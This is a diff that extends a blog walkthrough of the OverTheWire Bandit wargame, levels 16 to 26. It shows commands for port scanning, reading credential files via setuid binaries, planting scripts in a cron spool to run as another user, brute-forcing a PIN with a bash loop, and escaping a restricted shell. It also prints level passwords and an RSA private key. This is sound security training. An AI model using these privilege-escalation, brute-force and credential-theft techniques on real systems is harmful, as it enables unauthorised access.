@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "OverTheWire Wargames - Bandit"
+title:  "OverTheWire Wargames :: Bandit :: Levels 0-26"
 date:   2015-08-14
 ---
 
@@ -595,6 +595,492 @@ Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
 
 As it turns out, the script doesn't like to execute on ports which are not commonly used with SSL\TLS.  There is a fairly recent topic on this on their github [here](https://github.com/nmap/nmap/issues/168).
 
+Version detection might have some insight.
 
+```
+bandit16@melinda:~$ nmap -sV -p 31000-32000 --reason localhost
 
+Starting Nmap 6.40 ( http://nmap.org ) at 2015-08-28 04:59 UTC
+Nmap scan report for localhost (127.0.0.1)
+Host is up, received syn-ack (0.00087s latency).
+Not shown: 996 closed ports
+Reason: 996 conn-refused
+PORT      STATE SERVICE REASON  VERSION
+31046/tcp open  echo    syn-ack
+31518/tcp open  msdtc   syn-ack Microsoft Distributed Transaction Coordinator (error)
+31691/tcp open  echo    syn-ack
+31790/tcp open  msdtc   syn-ack Microsoft Distributed Transaction Coordinator (error)
+31960/tcp open  echo    syn-ack
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.39 seconds
+```
+
+Out of curiosity let's connect to `echo` and see if it's what we'd expect.
+
+```
+bandit16@melinda:~$ ncat -v 127.0.0.1 31046   
+Ncat: Version 6.40 ( http://nmap.org/ncat )
+Ncat: Connected to 127.0.0.1:31046.
+balls
+balls
+^C
+``` 
+
+Indeed!  That leaves only two ports that can be checked manually.  I'll guess the second one since I did this already and know the answer. ;)
+
+```
+bandit16@melinda:~$ ncat -v --ssl 127.0.0.1 31790                            
+Ncat: Version 6.40 ( http://nmap.org/ncat )
+Ncat: SSL connection to 127.0.0.1:31790.
+Ncat: SHA-1 fingerprint: 6872 7805 D7EC 03BA 51E2 B301 2651 8989 0556 7D66
+cluFn7wTiGryunymYOu4RcffSxQluehd
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+```
+
+# Level 17 > Level 18
+
+> There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new
+
+Save the key from the previous level on your local machine, fix its permissions for use, and log in.
+
+```
+otw@sake:~/bandit$ vim bandit17
+[...]
+otw@sake:~/bandit$ chmod 600 bandit17
+otw@sake:~/bandit$ ssh -i bandit17 bandit17@bandit.labs.overthewire.org
+```
+
+There are two text files in the home directory as expected.
+
+```
+bandit17@melinda:~$ ls
+passwords.new  passwords.old
+bandit17@melinda:~$ file *
+passwords.new: ASCII text
+passwords.old: ASCII text
+```
+
+The `diff` command will report differences between them.
+
+```
+bandit17@melinda:~$ diff passwords.old passwords.new 
+42c42
+< BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
+---
+> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+```
+
+# Level 18 > Level 19
+
+> The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.
+
+Try to log in.
+
+```
+otw@sake:~/bandit$ ssh bandit18@bandit.labs.overthewire.org
+[...]
+Byebye !
+Connection to bandit.labs.overthewire.org closed.
+```
+
+The login is successful but the connection immediately closes as expected.  A command supplied as an argument to the `ssh` command will execute on the remote system and output to our terminal.  First confirm we can do this by checking that the file we're looking for is present.
+
+```
+otw@sake:~/bandit$ ssh bandit18@bandit.labs.overthewire.org ls -lh
+[...]
+bandit18@bandit.labs.overthewire.org's password: 
+total 4.0K
+-rw-r----- 1 bandit19 bandit18 33 Nov 14  2014 readme
+```
+
+Experiment succesful - `cat` it out.
+
+```
+otw@sake:~/bandit$ ssh bandit18@bandit.labs.overthewire.org cat readme
+[...]
+bandit18@bandit.labs.overthewire.org's password: 
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+```
+
+# Level 19 > Level 20
+
+> To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used to setuid binary.
+
+First confirm the expected.
+
+```
+bandit19@melinda:~$ ls -lh
+total 8.0K
+-rwsr-x--- 1 bandit20 bandit19 7.2K Nov 14  2014 bandit20-do
+bandit19@melinda:~$ file bandit20-do 
+bandit20-do: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=08e74b8e092a91103efaab7916d75f08b887ab4d, not stripped
+```
+
+Obviously what you should do when given a mysterious executable is run it!  
+
+```
+bandit19@melinda:~$ ./bandit20-do 
+Run a command as another user.
+  Example: ./bandit20-do id
+bandit19@melinda:~$ ./bandit20-do id
+uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11020(bandit20),11019(bandit19)
+```
+
+Using this command we should be able to `cat` out `/etc/bandit_pass/bandit20` which belongs to bandit20.
+
+```
+bandit19@melinda:~$ ls -lh /etc/bandit_pass/bandit20
+-r-------- 1 bandit20 bandit20 33 Nov 14  2014 /etc/bandit_pass/bandit20
+bandit19@melinda:~$ ./bandit20-do cat !$ 
+./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+```
+
+Fun trick, `!$` is shorthand for the last argument of the previous command.
+
+# Level 20 > Level 21
+
+> There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
+
+Recon.
+
+```
+bandit20@melinda:~$ ls -lh
+total 8.0K
+-rwsr-x--- 1 bandit21 bandit20 7.9K Nov 14  2014 suconnect
+bandit20@melinda:~$ file suconnect 
+suconnect: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=abcc6c52af9bbea6e735f10665c1095b89c25bd5, not stripped
+bandit20@melinda:~$ ./suconnect 
+Usage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+```
+
+In one terminal we'll set a `netcat` listener ready to pump out the current password.  I'm in the habit of using `-nlvp` for this to not resolve DNS, listen, be verbose, and finally specify the port.
+
+```
+bandit20@melinda:~$ ncat -nlvp 6969 < /etc/bandit_pass/bandit20
+Ncat: Version 6.40 ( http://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+
+```
+
+In the second terminal we'll connect using the instructions provided by the usage message.
+
+```
+bandit20@melinda:~$ ./suconnect 6969
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+```
+
+Looking back at the listener we see that the connection from `suconnect` sent over a password.
+
+```
+bandit20@melinda:~$ ncat -nlvp 6969 < /etc/bandit_pass/bandit20
+Ncat: Version 6.40 ( http://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 127.0.0.1.
+Ncat: Connection from 127.0.0.1:40249.
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+```
+
+# Level 21 > Level 22
+
+> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+Check out `/etc/cron.d`.
+
+```
+bandit21@melinda:~$ cd /etc/cron.d
+bandit21@melinda:/etc/cron.d$ ls
+behemoth4_cleanup  cronjob_bandit24       melinda-stats          natas25_cleanup~  semtex0-32   sysstat
+cron-apt           cronjob_bandit24_root  natas-session-toucher  natas26_cleanup   semtex0-64   vortex0
+cronjob_bandit22   leviathan5_cleanup     natas-stats            natas27_cleanup   semtex0-ppc  vortex20
+cronjob_bandit23   manpage3_resetpw_job   natas25_cleanup        php5              semtex5
+```
+
+Presumably we're interested in cronjob_bandit22.
+
+```
+bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh 
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+
+Each time this script executes, a world-readable file is created in `/tmp` by bandit22 which contains bandit22's password.  How handy!
+
+For fun confirm and then `cat` it out.
+
+```
+bandit21@melinda:/etc/cron.d$ ls -lh /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+-rw-r--r-- 1 bandit22 bandit22 33 Aug 28 05:42 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@melinda:/etc/cron.d$ cat !$
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+
+# Level 22 > Level 23
+
+> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+As usual, first thing is to check it out.
+
+```
+bandit22@melinda:~$ cat /etc/cron.d/cronjob_bandit23
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@melinda:~$ cat /usr/bin/cronjob_bandit23.sh 
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+`$myname` will contain bandit23 because that is who invokes the script. `$mytarget` is calculated at runtime.  We'll repeat this step making sure to fill in the correct value for `$myname`.
+
+```
+bandit22@melinda:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 
+8ca319486bfbbc3663ea0fbe81326349
+```
+
+It's important to understand how the `cut` command works. In this case it cuts (d'oh) the string by spaces and returns the first substring.  We can see this by removing it from the command.
+
+```
+bandit22@melinda:~$ echo I am user bandit23 | md5sum 
+8ca319486bfbbc3663ea0fbe81326349  -
+```
+
+This reveals the secret location in `/tmp` of bandit23's password. Under normal circumstances we could just look in `/tmp` but this machine is configured with specific restrictions.
+
+```
+bandit22@melinda:~$ ls -lh /tmp/8ca319486bfbbc3663ea0fbe81326349
+-rw-rw-r-- 1 bandit23 bandit23 33 Aug 28 05:49 /tmp/8ca319486bfbbc3663ea0fbe81326349
+bandit22@melinda:~$ cat !$
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+# Level 23 > Level 24
+
+> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+Derp.
+
+```
+bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 "./$i"
+	rm -f "./$i"
+    fi
+done
+```
+
+The script does exactly as the `echo`'d description claims - running and then deleting all scripts in `/var/spool/bandit24`.  Bonus points for their not allowing infinite loops and the like to run indefinitely using the `timeout` command.
+
+Checking that this directory exists, we see it is writable by us (bandit23) and bandit24.
+
+```
+bandit23@melinda:~$ ls -alh /var/spool/bandit24/
+total 54K
+drwxrwxrwx 2 bandit24 bandit23  49K Aug 28 05:51 .
+drwxr-xr-x 6 root     root     4.0K May  3 12:32 ..
+```
+
+Since these are executed by bandit24, the most obvious tactic is to drop a script that will output bandit24's password. In order to retrieve it, we'll output to a file in our previously created, world-readable `/tmp` directory.
+
+The script:
+
+```sh
+cat /etc/bandit_pass/bandit24 > /tmp/588e5fd1b/bandit24
+```
+
+Create the script, set its permissions as executable, and wait for it to disappear.  A good way to do this is using the `watch` command but that's hard to depict here.
+
+```
+bandit23@melinda:/var/spool/bandit24$ vim mmc.sh
+[...]
+bandit23@melinda:/var/spool/bandit24$ chmod +x mmc.sh 
+bandit23@melinda:/var/spool/bandit24$ ls
+mmc.sh
+bandit23@melinda:/var/spool/bandit24$ ls
+mmc.sh
+bandit23@melinda:/var/spool/bandit24$ ls
+bandit23@melinda:/var/spool/bandit24$
+```
+
+Check for output and poof!
+
+```
+bandit23@melinda:/var/spool/bandit24$ cat /tmp/588e5fd1b/bandit24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+# Level 24 > Level 25
+
+> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinaties, called brute-forcing.
+
+For this we'll use the following script.
+
+```sh
+#!/bin/bash
+
+for i in {0000..9999}
+do
+    echo "$i *************"
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | ncat 127.0.0.1 30002
+done
+```
+
+I did not know if `bash` would accept the quadruple 0's, but a quick test on the side shows it works.
+
+The first `echo` is to mark our place in the bruteforce, in case that isn't clear from any output returned by the service.  Run the script and use the `tee` command to output to `stdout` while saving a copy to disk.
+
+```
+bandit24@melinda:/tmp/588e5fd1b$ ./bandit25.sh | tee bandit25.out
+0000 *************
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password. Try again.
+Exiting.
+0001 *************
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password. Try again.
+Exiting.
+0002 *************
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password. Try again.
+Exiting.
+0003 ***********
+[...]
+```
+
+I chose this technique because we're bruteforcing over a relatively small space and having all the results for later analysis is powerful. Typically this is not feasible and we'd have to check for the desired output at each iteration in some way. 
+
+Previous levels use "Correct" so we'll search for that.  `grep -C` will display lines adjacent to the match which we'll need since the password isn't on that line.
+
+```
+bandit24@melinda:/tmp/588e5fd1b$ grep -C 2 Correct bandit25.out 
+5669 *************
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+
+# Level 25 > Level 26
+
+> Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+The shell assigned to a user is stored in `/etc/passwd`.
+
+```
+bandit25@melinda:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@melinda:~$ cat /usr/bin/showtext 
+#!/bin/sh
+
+more ~/text.txt
+exit 0
+```
+
+Apparently when bandit26 logs in instead of getting a file in bandit26's home directory is `more`'d out.  The 'fairly easy' bit in the level description is a reference to the fact that we are given an ssh key.  Let's try the login.
+
+```
+bandit25@melinda:~$ ls
+bandit26.sshkey
+bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost
+[...]
+ | |                   | (_) | |__ \ / /  
+ | |__   __ _ _ __   __| |_| |_   ) / /_  
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
+Connection to localhost closed.
+```
+
+The fact that the script uses `more` is critial here.  Let's examine the behavior of `more`.
+
+When a file is shorter than the terminal, it is displayed and `more` exits.
+
+![short.txt](/assets/images/otw-bandit/bandit25-01.png)
+
+When a file is longer than the terminal, the portion which fits is displayed and `more` waits for user input to move through the file.
+
+![long.txt](/assets/images/otw-bandit/bandit25-02.png)
+
+During this time if we press the `v` key, `more` will open the file in a text editor.  From the manpage:
+
+```
+     v           Start up an editor at current line.  The editor is taken from
+                 the environment variable VISUAL if defined, or EDITOR if VIS‐
+                 UAL is not defined, or defaults to "vi" if neither VISUAL nor
+                 EDITOR is defined.
+```
+
+Once in the editor, we can open another file - namely the one which contains bandit26's password!  The trick here is to make our window so small that the login banner exceeds the height of the terminal and `more` waits for input.
+
+![long.txt](/assets/images/otw-bandit/bandit25-03.png)
+
+Open the password file from within `vim`.
+
+![long.txt](/assets/images/otw-bandit/bandit25-04.png)
+
+Boom!
+
+![long.txt](/assets/images/otw-bandit/bandit25-05.png)
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+Very creative challenge, really enjoyed getting that one.
+
+# Level 26 > Level 27
+
+> At this moment, level 27 does not exist yet.
+
+Boo.
